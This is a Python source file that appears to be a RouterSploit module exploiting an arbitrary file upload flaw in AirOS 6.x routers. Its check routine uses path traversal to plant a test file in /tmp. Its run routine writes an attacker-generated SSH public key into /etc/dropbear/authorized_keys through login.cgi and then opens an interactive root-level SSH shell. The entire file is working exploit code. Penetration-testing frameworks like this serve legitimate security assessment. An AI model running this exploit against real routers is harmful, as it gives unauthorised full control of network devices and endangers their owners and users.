import tempfile
import StringIO
import paramiko

from routersploit import (
    exploits,
    print_success,
    print_error,
    random_text,
    http_request,
    mute,
    validators,
    ssh_interactive,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for AirOS 6.x - Arbitrary File Upload.
    If the target is vulnerable is possible to take full control of the router
    """

    __info__ = {
        'name': 'AirOS 6.x - Arbitrary File Upload',
        'description': 'Exploit implementation for AirOS 6.x - Arbitrary File Upload. '
                       'If the target is vulnerable is possible to take full control of the router',
        'authors': [
            '93c08539',  # Vulnerability discovery
            'Vinicius Henrique Marangoni'  # routersploit module
        ],
        'references': [
            'https://hackerone.com/reports/73480',
            'https://www.exploit-db.com/exploits/39701/'
        ],
        'devices': [
            'AirOS 6.x'
        ]
    }

    target = exploits.Option('', 'Target address e.g. https://192.168.1.1', validators=validators.url)  # Target address
    port = exploits.Option(443, 'Target port e.g. 443', validators=validators.integer)  # Default port
    ssh_port = exploits.Option(22, 'Target SSH Port', validators=validators.integer)  # target ssh port

    def run(self):
        if self.check():
            print_success('Target is vulnerable')
            print_success('Trying to exploit by uploading SSH public key')

            key = paramiko.RSAKey.generate(1024)
            public_key = key.get_base64()
            private_key = StringIO.StringIO()
            key.write_private_key(private_key)

            tmp_file_pubkey = tempfile.TemporaryFile()
            tmp_file_pubkey.write('ssh-rsa ' + public_key)
            tmp_file_pubkey.seek(0)

            upload_params = {'file': ('../../etc/dropbear/authorized_keys', tmp_file_pubkey, {'Expect': ''})}

            upload_url = '{0}:{1}/login.cgi' .format(self.target, self.port)
            response = http_request(url=upload_url, method='POST', files=upload_params)

            if response is None:
                print_error('Something was wrong while uploading the SSH Public Key')
                return

            print_success('Appareantly the exploit worked fine')
            print_success('Trying to invoke a interactive SSH Shell')

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            pseudo_privkey_file = StringIO.StringIO(private_key.getvalue())
            pkey = paramiko.RSAKey.from_private_key(pseudo_privkey_file)
            pseudo_privkey_file.close()
            private_key.close()

            ip_target = self.target.replace('https://', '')
            ip_target = ip_target.replace('http://', '')
            ip_target = ip_target.replace('/', '')

            client.connect(ip_target, self.ssh_port, username='ubnt', pkey=pkey)
            ssh_interactive(client)

        else:
            print_error('Target is not vulnerable')

    @mute
    def check(self):
        base_url = '{}:{}/' .format(self.target, self.port)

        upload_url = base_url + 'login.cgi'
        response = http_request(url=upload_url, method='GET')

        if response is None:
            return False  # Target not vulnerable

        rand_str = random_text(length=16)

        tmp_payload = tempfile.TemporaryFile()
        tmp_payload.write('vulnerable' + rand_str)
        tmp_payload.seek(0)

        upload_params = {'file': ('../../../../tmp/airview.uavr', tmp_payload, {'Expect': ''})}

        response = http_request(url=upload_url, method='POST', files=upload_params)

        tmp_payload.close()

        if response is None:
            return False  # Target not vulnerable

        # Response to verify if the upload was done correctly
        airview_url = base_url + 'airview.uavr'
        verify_upload = http_request(url=airview_url, method='GET')

        # Upload empty file to "clear" the airview.uavr file
        clean_tmp_file = tempfile.TemporaryFile()
        clean_tmp_file.seek(0)

        upload_params = {'file': ('../../../../tmp/airview.uavr', clean_tmp_file, {'Expect': ''})}

        http_request(url=upload_url, method='POST', files=upload_params)
        clean_tmp_file.close()

        if "".join(('vulnerable', rand_str)) in verify_upload.text:
            return True
        else:
            return False
